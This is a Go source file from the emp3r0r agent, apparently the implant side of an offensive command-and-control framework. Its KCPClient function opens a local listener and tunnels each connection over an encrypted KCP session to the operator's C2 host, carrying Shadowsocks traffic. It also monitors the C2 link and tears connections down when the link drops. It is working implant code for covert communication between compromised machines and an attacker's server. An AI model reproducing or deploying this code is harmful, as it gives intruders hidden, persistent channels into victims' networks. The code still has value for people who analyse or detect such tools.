package agent

import (
	"context"
	"crypto/sha256"
	"fmt"
	"io"
	"log"
	"net"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/xtaci/kcp-go/v5"
	"golang.org/x/crypto/pbkdf2"
)

// Connect to C2 KCP server, forward Shadowsocks traffic
func KCPClient() {
	if !RuntimeConfig.UseKCP {
		return
	}
	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%s", RuntimeConfig.KCPPort))
	if err != nil {
		log.Printf("KCPClient: %v", err)
		return
	}
	defer func() {
		if ln != nil {
			ln.Close()
		}
		log.Print("KCPClient exited")
	}()

	serve_conn := func(client_conn net.Conn) {
		// log
		log.Printf("KCP: serving conn %s -> %s",
			client_conn.LocalAddr(),
			client_conn.RemoteAddr())

		// monitor C2 connection state
		ctx, cancel := context.WithCancel(context.Background())
		go func() {
			for emp3r0r_data.KCPKeep {
				util.TakeABlink()
			}
			// kill client_conn if lost C2 connection
			log.Printf("Killing KCP client conn %s as C2 is disconnected", client_conn.LocalAddr())
			cancel()
			emp3r0r_data.KCPKeep = true
		}()

		// dial to C2 KCP server
		key := pbkdf2.Key([]byte(RuntimeConfig.Password),
			[]byte(emp3r0r_data.MagicString), 1024, 32, sha256.New)
		block, _ := kcp.NewAESBlockCrypt(key)

		sess, err := kcp.DialWithOptions(fmt.Sprintf("%s:%s",
			RuntimeConfig.CCHost, RuntimeConfig.KCPPort),
			block, 10, 3)
		defer func() {
			sess.Close()
			client_conn.Close()
			log.Printf("KCP: done with conn %s -> %s",
				client_conn.LocalAddr(),
				client_conn.RemoteAddr())
		}()
		if err != nil {
			log.Printf("KCP dial: %v", err)
			return
		}
		go func() {
			_, err = io.Copy(sess, client_conn)
			if err != nil {
				log.Printf("client_conn -> kcp: %v", err)
				return
			}
		}()
		go func() {
			_, err = io.Copy(client_conn, sess)
			if err != nil {
				log.Printf("client_conn -> kcp: %v", err)
				return
			}
		}()
		for ctx.Err() == nil {
			util.TakeABlink()
		}
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("KCPClient accept: %v", err)
			continue
		}
		go serve_conn(conn)
	}
}
